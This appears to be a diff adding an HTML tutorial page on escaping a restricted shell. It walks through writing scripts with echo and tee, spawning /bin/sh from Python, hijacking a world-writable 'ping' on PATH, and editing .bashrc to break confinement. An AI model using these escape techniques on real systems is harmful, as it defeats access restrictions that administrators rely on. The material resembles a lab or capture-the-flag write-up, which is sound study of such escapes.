@@ -1,0 +1,32 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Make Your Own Script</title>
+</head><body>Tee Command<br/>
+<br/>
+If you do not have access to an editor, and would like to create a script, you can make use of the 'tee' command. Since you cannot make use of '&gt;' or '&gt;&gt;', the 'tee' command can help you direct your output when used in tandem with the 'echo' command. This is not a shell escape in of itself, but consider the following:<br/>
+echo "evil script code" | tee script.sh<br/>
+<br/>
+You will be able to create a file called script.sh in your home directory and add your script code to the file. Once the file is created, use the 'tee -a' option for all subsequent commands as the '-a' allows you to append to the file rather than overwrite the file.<br/>
+<br/>
+python: <br/>
+exit_code = os.system('/bin/sh') <br/>
+output = os.popen('/bin/sh').read()<br/>
+<br/>
+$ cat /tmp/id.sh<br/>
+#!/bin/sh<br/>
+/usr/bin/id<br/>
+<br/>
+In this example, ping is a world writable executable located within the $PATH<br/>
+When a terminal opens up, it reads .bashrc which tells it what behavior to default to. I used my ping script to cat my .bashrc<br/>
+echo '#!/bin/bash' | tee '/home/confined1/bin/ping'<br/>
+echo '/bin/cat /home/confined1/.bashrc' | tee -a '/home/confined1/bin/ping'<br/>
+<br/>
+confined1@someserver:~$ ping<br/>
+PATH=/home/confined1/bin<br/>
+export PATH<br/>
+confined1@someserver:~$<br/>
+<br/>
+This is what I found. So if we change our .bashrc file so that instead of setting our PATH, it sets our SHELL then we should be free!<span style="font-size: 10pt"><br/>
+</span><span style="font-size: 10pt"><span style="font-family: Helvetica Neue Light"><div style="text-align: justify">There we go, so now we log out, and back in again. When we log back in, our system will read our new .bashrc file and we'll be home free!</div></span>&nbsp; </span></body></html>
